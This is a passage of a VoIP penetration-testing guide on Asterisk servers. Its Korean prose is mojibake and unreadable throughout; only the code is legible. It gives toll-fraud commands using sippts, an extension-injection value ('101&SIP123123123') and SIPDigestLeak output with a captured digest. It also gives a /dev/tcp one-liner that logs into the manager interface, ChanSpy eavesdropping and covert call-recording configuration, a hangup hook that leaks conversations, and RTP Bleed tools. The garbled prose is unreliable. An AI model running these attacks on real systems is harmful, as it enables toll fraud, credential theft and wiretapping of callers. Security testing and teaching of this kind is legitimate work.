ì•ˆë‚´ì„œì—ì„œëŠ” ì»¨í…ìŠ¤íŠ¸ ë‚´ì—ì„œ í™•ì¥ì(ë‹¤ì´ì–¼ ë²ˆí˜¸ì˜ íŒ¨í„´)ë¥¼ ì •ì˜í•˜ê³  í•´ë‹¹ í™•ì¥ìë¥¼ ì¼ë ¨ì˜ ë™ì‘ ë˜ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ê³¼ ì—°ê²°í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë™ì‘ì€ í†µí™” ì²˜ë¦¬ ë°©ì‹ì„ ê²°ì •í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
ì´ ì˜ˆì œëŠ” "my\_context"ë¼ëŠ” ê°„ë‹¨í•œ ì»¨í…ìŠ¤íŠ¸ì™€ "100"ì´ë¼ëŠ” í™•ì¥ìë¥¼ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ëˆ„êµ°ê°€ê°€ 100ì„ ëˆ„ë¥´ë©´ ì „í™”ê°€ ë°›ì•„ì§€ê³ , í™˜ì˜ ë©”ì‹œì§€ê°€ ì¬ìƒë˜ë©°, ê·¸ í›„ ì „í™”ê°€ ì¢…ë£Œë©ë‹ˆë‹¤.

ì´ê²ƒì€ **ë‹¤ë¥¸ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆëŠ”** **ë‹¤ë¥¸ ì»¨í…ìŠ¤íŠ¸**ì…ë‹ˆë‹¤:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
ë§Œì•½ ê´€ë¦¬ìê°€ **ê¸°ë³¸ ì»¨í…ìŠ¤íŠ¸**ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì •ì˜í•œë‹¤ë©´:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
ëˆ„êµ¬ë‚˜ **ì„œë²„ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤** (ì„œë²„ ê´€ë¦¬ìê°€ ì „í™” ìš”ê¸ˆì„ ì§€ë¶ˆí•©ë‹ˆë‹¤).
{% endhint %}

{% hint style="danger" %}
ë˜í•œ, ê¸°ë³¸ì ìœ¼ë¡œ **`sip.conf`** íŒŒì¼ì—ëŠ” **`allowguest=true`**ê°€ í¬í•¨ë˜ì–´ ìˆìœ¼ë¯€ë¡œ **ì¸ì¦ ì—†ì´** ì–´ë–¤ ê³µê²©ìë“  ë‹¤ë¥¸ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

*   [**sippts**](https://github.com/Pepelux/sippts)ì˜ **`sipinvite.py`**:** SipinviteëŠ” **ì¸ì¦ ì—†ì´ PBX ì„œë²„ì—ì„œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆëŠ”ì§€** í™•ì¸í•©ë‹ˆë‹¤. SIP ì„œë²„ê°€ ì˜ëª»ëœ êµ¬ì„±ì„ ê°€ì§€ê³  ìˆë‹¤ë©´ ì™¸ë¶€ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤. ë˜í•œ, ì „í™”ë¥¼ ë‘ ë²ˆì§¸ ì™¸ë¶€ ë²ˆí˜¸ë¡œ ì „ë‹¬í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, Asterisk ì„œë²„ì˜ ì»¨í…ìŠ¤íŠ¸ êµ¬ì„±ì´ ì˜ëª»ë˜ì—ˆë‹¤ë©´, ì¸ì¦ ì—†ì´ INVITE ìš”ì²­ì„ ìˆ˜ë½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš°, ê³µê²©ìëŠ” ì–´ë–¤ ì‚¬ìš©ì/ë¹„ë°€ë²ˆí˜¸ë„ ì•Œì§€ ëª»í•´ë„ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### ë¬´ë£Œ í†µí™” / ì˜ëª» êµ¬ì„±ëœ IVRS

IVRSëŠ” **Interactive Voice Response System**ì˜ ì•½ìë¡œ, ìŒì„± ë˜ëŠ” í„°ì¹˜í†¤ ì…ë ¥ì„ í†µí•´ ì‚¬ìš©ìê°€ ì»´í“¨í„°í™”ëœ ì‹œìŠ¤í…œê³¼ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆëŠ” ì „í™”ê¸° ê¸°ìˆ ì…ë‹ˆë‹¤. IVRSëŠ” ì •ë³´ ì œê³µ, ì „í™” ë¼ìš°íŒ…, ì‚¬ìš©ì ì…ë ¥ ìˆ˜ì§‘ ë“± ë‹¤ì–‘í•œ ê¸°ëŠ¥ì„ ì œê³µí•˜ëŠ” **ìë™í™”ëœ í†µí™” ì²˜ë¦¬** ì‹œìŠ¤í…œì„ êµ¬ì¶•í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

VoIP ì‹œìŠ¤í…œì—ì„œì˜ IVRSëŠ” ì¼ë°˜ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì„± ìš”ì†Œë¡œ ì´ë£¨ì–´ì ¸ ìˆìŠµë‹ˆë‹¤:

1. **ìŒì„± ì•ˆë‚´**: IVR ë©”ë‰´ ì˜µì…˜ê³¼ ì§€ì‹œì‚¬í•­ì„ ì‚¬ìš©ìì—ê²Œ ì•ˆë‚´í•˜ëŠ” ë¯¸ë¦¬ ë…¹ìŒëœ ì˜¤ë””ì˜¤ ë©”ì‹œì§€ì…ë‹ˆë‹¤.
2. **DTMF** (Dual-Tone Multi-Frequency) ì‹ í˜¸: ì „í™”ê¸°ì˜ í‚¤ë¥¼ ëˆŒëŸ¬ ìƒì„±ë˜ëŠ” í„°ì¹˜í†¤ ì…ë ¥ìœ¼ë¡œ, IVR ë©”ë‰´ë¥¼ íƒìƒ‰í•˜ê³  ì…ë ¥ì„ ì œê³µí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
3. **ì „í™” ë¼ìš°íŒ…**: ì‚¬ìš©ì ì…ë ¥ì— ë”°ë¼ íŠ¹ì • ë¶€ì„œ, ì—ì´ì „íŠ¸ ë˜ëŠ” ë‚´ì„ ê³¼ ê°™ì€ ì ì ˆí•œ ëŒ€ìƒìœ¼ë¡œ ì „í™”ë¥¼ ì—°ê²°í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.
4. **ì‚¬ìš©ì ì…ë ¥ ìˆ˜ì§‘**: ê³„ì • ë²ˆí˜¸, ì‚¬ë¡€ ID ë˜ëŠ” ê¸°íƒ€ ê´€ë ¨ ë°ì´í„°ì™€ ê°™ì€ í˜¸ì¶œìë¡œë¶€í„°ì˜ ì •ë³´ ìˆ˜ì§‘ì…ë‹ˆë‹¤.
5. **ì™¸ë¶€ ì‹œìŠ¤í…œê³¼ì˜ í†µí•©**: IVR ì‹œìŠ¤í…œì„ ë°ì´í„°ë² ì´ìŠ¤ë‚˜ ë‹¤ë¥¸ ì†Œí”„íŠ¸ì›¨ì–´ ì‹œìŠ¤í…œì— ì—°ê²°í•˜ì—¬ ì •ë³´ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸í•˜ê³ , ì‘ì—…ì„ ìˆ˜í–‰í•˜ê±°ë‚˜ ì´ë²¤íŠ¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

Asterisk VoIP ì‹œìŠ¤í…œì—ì„œëŠ” ë‹¤ì´ì–¼ í”Œëœ (**`extensions.conf`** íŒŒì¼) ë° `Background()`, `Playback()`, `Read()` ë“±ì˜ ë‹¤ì–‘í•œ ì‘ìš© í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•˜ì—¬ IVRì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì‘ìš© í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•˜ì—¬ ìŒì„± ì•ˆë‚´ë¥¼ ì¬ìƒí•˜ê³  ì‚¬ìš©ì ì…ë ¥ì„ ìˆ˜ì§‘í•˜ë©° í†µí™” íë¦„ì„ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ì·¨ì•½í•œ êµ¬ì„±ì˜ ì˜ˆì œ
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
ì´ì „ì€ ì‚¬ìš©ìê°€ **1ì„ ëˆŒëŸ¬** ë¶€ì„œì— ì „í™”ë¥¼ ê±¸ê±°ë‚˜, **2ë¥¼ ëˆŒëŸ¬** ë‹¤ë¥¸ ë¶€ì„œì— ì „í™”ë¥¼ ê±¸ê±°ë‚˜, **ì „ì²´ ë‚´ì„  ë²ˆí˜¸**ë¥¼ ì•Œê³  ìˆë‹¤ë©´ ì…ë ¥í•˜ë¼ëŠ” ì˜ˆì‹œì…ë‹ˆë‹¤.\
ì´ ì·¨ì•½ì ì€ ì§€ì •ëœ **ë‚´ì„  ë²ˆí˜¸ ê¸¸ì´ê°€ í™•ì¸ë˜ì§€ ì•Šì•„ ì‚¬ìš©ìê°€ 5ì´ˆì˜ ëŒ€ê¸° ì‹œê°„ ë™ì•ˆ ì „ì²´ ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ë©´ í˜¸ì¶œë  ìˆ˜ ìˆë‹¤ëŠ” ì‚¬ì‹¤ì…ë‹ˆë‹¤.**

### ë‚´ì„  ë²ˆí˜¸ ì‚½ì…

ë‹¤ìŒê³¼ ê°™ì€ ë‚´ì„  ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
**`${EXTEN}`**ì€ í˜¸ì¶œë  **ë‚´ì„ (extension)**ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. **ext 101ì´ ì…ë ¥**ë˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ì¼ì´ ë°œìƒí•©ë‹ˆë‹¤:
```scss
exten => 101,1,Dial(SIP/101)
```
ê·¸ëŸ¬ë‚˜, **`${EXTEN}`**ì´ (ì´ì „ Asterisk ë²„ì „ê³¼ ê°™ì´) **ìˆ«ì ì´ì™¸ì˜ ë¬¸ì**ë¥¼ ì…ë ¥í•  ìˆ˜ ìˆê²Œ í—ˆìš©í•œë‹¤ë©´, ê³µê²©ìëŠ” **`101&SIP123123123`**ì„ ì…ë ¥í•˜ì—¬ ì „í™”ë²ˆí˜¸ 123123123ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ì´ê²ƒì´ ê²°ê³¼ê°€ ë  ê²ƒì…ë‹ˆë‹¤:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
ë”°ë¼ì„œ, **`101`** í™•ì¥ìì™€ **`123123123`**ì— ëŒ€í•œ í†µí™”ê°€ ì „ì†¡ë˜ê³  í†µí™”ë¥¼ ë°›ëŠ” ì²« ë²ˆì§¸ í†µí™”ë§Œ ì„¤ì •ë©ë‹ˆë‹¤... ê·¸ëŸ¬ë‚˜ ê³µê²©ìê°€ ì¼ì¹˜í•˜ëŠ” ê²ƒì´ ì—†ì§€ë§Œ ìˆ˜í–‰ë˜ê³  ìˆëŠ” **ì–´ë–¤ ì¼ì¹˜ë„ ìš°íšŒí•˜ëŠ” í™•ì¥ì**ë¥¼ ì‚¬ìš©í•˜ë©´, ê·¸ëŠ” **ì›í•˜ëŠ” ë²ˆí˜¸ë¡œë§Œ í†µí™”ë¥¼ ì£¼ì…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## SIPDigestLeak

SIP Digest Leakì€ í•˜ë“œì›¨ì–´ ë° ì†Œí”„íŠ¸ì›¨ì–´ IP ì „í™”ê¸° ë° ì „í™” ì–´ëŒ‘í„° (VoIPì—ì„œ ì•„ë‚ ë¡œê·¸ë¡œ)ë¥¼ í¬í•¨í•œ ë§ì€ ìˆ˜ì˜ SIP ì „í™”ê¸°ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ë¹„ë°€ë²ˆí˜¸ì—ì„œ ê³„ì‚°ëœ Digest ì¸ì¦ ì‘ë‹µì´ **ìœ ì¶œë˜ëŠ” ê²ƒì„ í—ˆìš©**í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ì˜¤í”„ë¼ì¸ ë¹„ë°€ë²ˆí˜¸ ê³µê²©ì´ ê°€ëŠ¥í•˜ë©° ë„ì „ ì‘ë‹µì„ ê¸°ë°˜ìœ¼ë¡œ ëŒ€ë¶€ë¶„ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³µêµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**[ì—¬ê¸°ì—ì„œ ì·¨ì•½ì  ì‹œë‚˜ë¦¬ì˜¤ ì°¸ì¡°**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP ì „í™”ê¸° (í”¼í•´ì)ê°€ 5060ë²ˆ í¬íŠ¸ì—ì„œ ìˆ˜ì‹  ëŒ€ê¸°í•˜ê³  ì „í™”ë¥¼ ë°›ìŠµë‹ˆë‹¤.
2. ê³µê²©ìê°€ IP ì „í™”ê¸°ì— INVITEë¥¼ ë³´ëƒ…ë‹ˆë‹¤.
3. í”¼í•´ì ì „í™”ê¸°ê°€ ìš¸ë¦¬ê¸° ì‹œì‘í•˜ê³  ëˆ„êµ°ê°€ ì „í™”ë¥¼ ë°›ì•„ì„œ ë°”ë¡œ ëŠìŠµë‹ˆë‹¤ (ë‹¤ë¥¸ ìª½ì—ì„œ ì „í™”ì— ì‘ë‹µí•˜ëŠ” ì‚¬ëŒì´ ì—†ê¸° ë•Œë¬¸ì—).
4. ì „í™”ê°€ ëŠì–´ì§€ë©´ **í”¼í•´ì ì „í™”ê¸°ê°€ ê³µê²©ìì—ê²Œ BYEë¥¼ ë³´ëƒ…ë‹ˆë‹¤**.
5. **ê³µê²©ìëŠ” ì¸ì¦ì„ ìš”ì²­í•˜ëŠ” 407 ì‘ë‹µ**ì„ ë°œí–‰í•˜ê³  ì¸ì¦ ë„ì „ì„ ë°œí–‰í•©ë‹ˆë‹¤.
6. **í”¼í•´ì ì „í™”ê¸°ëŠ” ë‘ ë²ˆì§¸ BYEì—ì„œ ì¸ì¦ ë„ì „ì— ëŒ€í•œ ì‘ë‹µ**ì„ ì œê³µí•©ë‹ˆë‹¤.
7. **ê³µê²©ìëŠ” ë¡œì»¬ ë¨¸ì‹  (ë˜ëŠ” ë¶„ì‚° ë„¤íŠ¸ì›Œí¬ ë“±)ì—ì„œ ë„ì „ ì‘ë‹µì— ëŒ€í•œ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©**ì„ ìˆ˜í–‰í•˜ê³  ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* [**sippts**](https://github.com/Pepelux/sippts)ì˜ **sipdigestleak.py**ëŠ” ì´ ì·¨ì•½ì ì„ ì´ìš©í•©ë‹ˆë‹¤.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### í´ë¦­íˆ¬ì½œ

í´ë¦­íˆ¬ì½œì€ **ì›¹ ì‚¬ìš©ì**(ì˜ˆë¥¼ ë“¤ì–´ ì œí’ˆì— ê´€ì‹¬ì´ ìˆëŠ” ì‚¬ìš©ì)ê°€ **ì „í™”ë²ˆí˜¸ë¥¼ ì…ë ¥**í•˜ì—¬ ì „í™”ë¥¼ ë°›ì„ ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì…ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ìƒì—…ìš© ì „í™”ê°€ ê±¸ë¦¬ê³ , ì‚¬ìš©ìê°€ **ì „í™”ë¥¼ ë°›ìœ¼ë©´ ì—ì´ì „íŠ¸ì™€ ì—°ê²°**ë©ë‹ˆë‹¤.

ì´ë¥¼ ìœ„í•œ ì¼ë°˜ì ì¸ Asterisk í”„ë¡œí•„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* ì´ì „ í”„ë¡œí•„ì€ **ì•Œë ¤ì§„ ë¹„ë°€ë²ˆí˜¸ë¡œ ì–´ë–¤ IP ì£¼ì†Œë“  ì—°ê²°ì„ í—ˆìš©**í•©ë‹ˆë‹¤.
* ì´ì „ì— ì–¸ê¸‰í•œ ê²ƒì²˜ëŸ¼ **í†µí™”ë¥¼ ì¡°ì§**í•˜ê¸° ìœ„í•´ì„œëŠ” **ì½ê¸° ê¶Œí•œì´ í•„ìš”í•˜ì§€ ì•Šìœ¼ë©°**, **ì“°ê¸°**ì—ì„œ **originate**ë§Œ í•„ìš”í•©ë‹ˆë‹¤.

ì´ëŸ¬í•œ ê¶Œí•œìœ¼ë¡œ ì¸í•´ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œê³  ìˆëŠ” ì–´ë–¤ IPë„ ì—°ê²°í•˜ê³  ë„ˆë¬´ ë§ì€ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**ì¶”ê°€ ì •ë³´ë‚˜ ì¡°ì¹˜ë¥¼ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

### **ë„ì²­**

Asteriskì—ì„œëŠ” **`ChanSpy`** ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ **ê°ì‹œí•  í™•ì¥ì(ë“¤)** (ë˜ëŠ” ëª¨ë“  í™•ì¥ì)ë¥¼ ì§€ì •í•˜ì—¬ ì§„í–‰ ì¤‘ì¸ ëŒ€í™”ë¥¼ ë“¤ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ëª…ë ¹ì€ í™•ì¥ìì— í• ë‹¹ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, **`exten => 333,1,ChanSpy('all',qb)`**ëŠ” **í™•ì¥ì 333**ì„ **í˜¸ì¶œ**í•˜ë©´ **`all`** í™•ì¥ìë¥¼ **ëª¨ë‹ˆí„°ë§**í•˜ê³ , ìƒˆë¡œìš´ ëŒ€í™”ê°€ ì‹œì‘ë  ë•Œë§ˆë‹¤ (**`b`**) ì¡°ìš©í•œ ëª¨ë“œ (**`q`**)ë¡œ **ë“¤ì„ ìˆ˜ ìˆë„ë¡** ì„¤ì •í•©ë‹ˆë‹¤. ëŒ€í™”ì—ì„œ ë‹¤ë¥¸ ëŒ€í™”ë¡œ ì´ë™í•˜ë ¤ë©´ **`*`**ì„ ëˆ„ë¥´ê±°ë‚˜ í™•ì¥ì ë²ˆí˜¸ë¥¼ ì„ íƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ëŒ€í™”ë¥¼ ë“£ëŠ” ëŒ€ì‹ , í™•ì¥ìë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€í™”ë¥¼ **íŒŒì¼ë¡œ ê¸°ë¡**í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

í†µí™”ëŠ” **`/tmp`**ì— ì €ì¥ë©ë‹ˆë‹¤.

ë˜í•œ Asteriskê°€ ì¢…ë£Œë  ë•Œ í†µí™”ë¥¼ ìœ ì¶œì‹œí‚¬ ìˆ˜ ìˆëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed**ì€ Asterisk ê¸°ë°˜ì˜ VoIP ì„œë²„ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ì£¼ìš” ë³´ì•ˆ ë¬¸ì œì…ë‹ˆë‹¤(2017ë…„ì— ë°œí‘œë˜ì—ˆìŠµë‹ˆë‹¤). ì´ ì·¨ì•½ì ì€ **VoIP ëŒ€í™”ë¥¼ ì „ë‹¬í•˜ëŠ” RTP(ì‹¤ì‹œê°„ í”„ë¡œí† ì½œ) íŠ¸ë˜í”½**ì´ **ì¸í„°ë„· ìƒì˜ ëˆ„êµ¬ì—ê²Œë‚˜ ê°€ë¡œì±„ê³  ì¬ì§€ì •ë  ìˆ˜ ìˆë„ë¡** í—ˆìš©í•©ë‹ˆë‹¤. ì´ëŠ” RTP íŠ¸ë˜í”½ì´ NAT(ë„¤íŠ¸ì›Œí¬ ì£¼ì†Œ ë³€í™˜) ë°©í™”ë²½ì„ í†µê³¼í•  ë•Œ ì¸ì¦ì„ ìš°íšŒí•˜ê¸° ë•Œë¬¸ì— ë°œìƒí•©ë‹ˆë‹¤.

RTP í”„ë¡ì‹œëŠ” ë‘ ê°œ ì´ìƒì˜ ë‹¹ì‚¬ì ê°„ì˜ RTP ìŠ¤íŠ¸ë¦¼ì„ í”„ë¡ì‹œí•˜ëŠ” ë° ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” RTC ì‹œìŠ¤í…œì˜ NAT ì œí•œì„ í•´ê²°í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. NATê°€ ì ìš©ë˜ë©´ RTP í”„ë¡ì‹œ ì†Œí”„íŠ¸ì›¨ì–´ëŠ” ì¢…ì¢… ì‹œê·¸ë„ë§(ì˜ˆ: SIP)ì„ í†µí•´ ê²€ìƒ‰ëœ RTP IP ë° í¬íŠ¸ ì •ë³´ì— ì˜ì¡´í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì¼ë¶€ RTP í”„ë¡ì‹œëŠ” ì´ëŸ¬í•œ IP ë° í¬íŠ¸ íŠœí”Œì´ ìë™ìœ¼ë¡œ í•™ìŠµë˜ëŠ” ë©”ì»¤ë‹ˆì¦˜ì„ êµ¬í˜„í–ˆìŠµë‹ˆë‹¤. ì´ëŠ” ë“¤ì–´ì˜¤ëŠ” RTP íŠ¸ë˜í”½ì„ ê²€ì‚¬í•˜ê³  ë“¤ì–´ì˜¤ëŠ” RTP íŠ¸ë˜í”½ì˜ ì†ŒìŠ¤ IPì™€ í¬íŠ¸ë¥¼ ì‘ë‹µí•´ì•¼ í•  IPì™€ í¬íŠ¸ë¡œ í‘œì‹œí•˜ëŠ” ê²ƒìœ¼ë¡œ ìë™ìœ¼ë¡œ í•™ìŠµë©ë‹ˆë‹¤. ì´ ë©”ì»¤ë‹ˆì¦˜ì€ "í•™ìŠµ ëª¨ë“œ"ë¼ê³  ë¶ˆë¦´ ìˆ˜ ìˆìœ¼ë©° **ì¸ì¦ì„ ì‚¬ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ **ê³µê²©ì**ëŠ” **RTP í”„ë¡ì‹œë¡œ RTP íŠ¸ë˜í”½ì„ ë³´ë‚¼ ìˆ˜ ìˆìœ¼ë©°** RTP ìŠ¤íŠ¸ë¦¼ì˜ í˜¸ì¶œì ë˜ëŠ” í”¼í˜¸ì¶œìì—ê²Œ ì „ë‹¬ë˜ì–´ì•¼ í•˜ëŠ” í”„ë¡ì‹œëœ RTP íŠ¸ë˜í”½ì„ ìˆ˜ì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ RTP Bleedë¼ê³  ë¶€ë¥´ë©°, ì´ëŠ” ê³µê²©ìê°€ í•©ë²•ì ì¸ ì‚¬ìš©ìì—ê²Œ ì „ì†¡ë˜ì–´ì•¼ í•˜ëŠ” RTP ë¯¸ë””ì–´ ìŠ¤íŠ¸ë¦¼ì„ ìˆ˜ì‹ í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

RTP í”„ë¡ì‹œì™€ RTP ìŠ¤íƒì˜ ë˜ ë‹¤ë¥¸ í¥ë¯¸ë¡œìš´ ë™ì‘ì€ ë•Œë¡œëŠ” **RTP Bleedì— ì·¨ì•½í•˜ì§€ ì•Šë”ë¼ë„** ì–´ë–¤ ì†ŒìŠ¤ì—ì„œë“  RTP íŒ¨í‚·ì„ **ìˆ˜ë½, ì „ë‹¬ ë°/ë˜ëŠ” ì²˜ë¦¬**í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” í•©ë²•ì ì¸ RTP ìŠ¤íŠ¸ë¦¼ ëŒ€ì‹  ë¶ˆë²•ì ì¸ ë¯¸ë””ì–´ë¥¼ ì£¼ì…í•  ìˆ˜ ìˆëŠ” RTP íŒ¨í‚·ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê³µê²©ì„ RTP ì£¼ì…ì´ë¼ê³  ë¶€ë¥´ë©°, ì´ëŠ” RTP í”„ë¡ì‹œì™€ ì—”ë“œí¬ì¸íŠ¸ ëª¨ë‘ì—ì„œ ë°œê²¬ë  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.

Asteriskì™€ FreePBXëŠ” ê¸°ì¡´ì— **`NAT=yes` ì„¤ì •**ì„ ì‚¬ìš©í•˜ì—¬ RTP íŠ¸ë˜í”½ì´ ì¸ì¦ì„ ìš°íšŒí•˜ë„ë¡ í—ˆìš©í•˜ì—¬ í†µí™” ì¤‘ì— ì˜¤ë””ì˜¤ê°€ ì—†ê±°ë‚˜ ì¼ë°©ì ì¸ ì˜¤ë””ì˜¤ê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” [https://www.rtpbleed.com/](https://www.rtpbleed.com/)ì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.

* [**sippts**](https://github.com/Pepelux/sippts)ì˜ **`rtpbleed.py`**ëŠ” RTP Bleed ì·¨ì•½ì ì„ ê°ì§€í•˜ê¸° ìœ„í•´ RTP ìŠ¤íŠ¸ë¦¼ì„ ë³´ëƒ…ë‹ˆë‹¤.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`**ì€ [**sippts**](https://github.com/Pepelux/sippts)ì—ì„œ ì œê³µí•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤. RTP ìŠ¤íŠ¸ë¦¼ì„ ì „ì†¡í•˜ì—¬ RTP Bleed ì·¨ì•½ì ì„ ê°ì§€í•©ë‹ˆë‹¤.
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`**ì€ [**sippts**](https://github.com/Pepelux/sippts)ì—ì„œ ê°€ì ¸ì˜¨ ê²ƒì…ë‹ˆë‹¤. RTP ë¸”ë¦¬ë“œ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ RTP ìŠ¤íŠ¸ë¦¼ì„ ì „ì†¡í•©ë‹ˆë‹¤.
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
